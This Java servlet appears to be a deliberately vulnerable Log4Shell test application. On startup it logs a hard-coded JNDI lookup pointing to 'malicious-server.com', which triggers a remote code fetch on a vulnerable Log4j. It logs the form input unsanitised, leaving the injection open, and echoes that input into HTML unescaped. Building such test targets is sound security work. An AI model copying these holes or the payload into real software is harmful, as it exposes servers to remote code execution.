import javax.servlet.*;
import javax.servlet.http.*;
import java.io.*;

public class VulnWebApp extends HttpServlet {
    static {
        // Vulnerable Log4j init
        org.apache.logging.log4j.LogManager.getLogger(VulnWebApp.class).error("App initialized: ${jndi:ldap://malicious-server.com/a}");
    }

    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        out.println("<html><body>");
        out.println("<h2>Log4Shell Test App</h2>");
        out.println("<form method='POST'>");
        out.println("Name: <input type='text' name='name'/><input type='submit' value='OK'/>");
        out.println("</form>");
        out.println("</body></html>");
    }

    protected void doPost(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        String name = request.getParameter("name");
        org.apache.logging.log4j.LogManager.getLogger(VulnWebApp.class).info("User input: " + name);
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        out.println("<html><body>");
        out.println("<h2>Hello, " + name + "</h2>");
        out.println("</body></html>");
    }
}
